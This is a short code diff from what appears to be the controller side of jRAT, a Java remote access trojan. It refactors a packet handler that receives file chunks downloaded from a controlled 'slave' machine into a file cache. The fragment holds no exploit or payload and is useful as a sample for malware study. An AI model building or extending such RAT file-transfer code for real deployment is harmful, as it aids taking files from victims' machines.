@@ -5,18 +5,17 @@ import jrat.common.io.TransferData;
 import jrat.controller.Slave;
 import jrat.controller.ui.panels.PanelFileTransfers;
 
-import java.io.DataInputStream;
 import java.io.File;
 
 public class Packet29ServerDownloadPart extends AbstractIncomingPacket {
 
 	@Override
-	public void read(Slave slave, DataInputStream dis) throws Exception {
+	public void read(Slave slave) throws Exception {
 		String remotePath = slave.readLine();
-		int len = dis.readInt();
+		int len = slave.readInt();
 
 		byte[] buffer = new byte[len];
-		dis.readFully(buffer);
+        slave.readFully(buffer);
 
 		TransferData data = FileCache.get(remotePath);
 
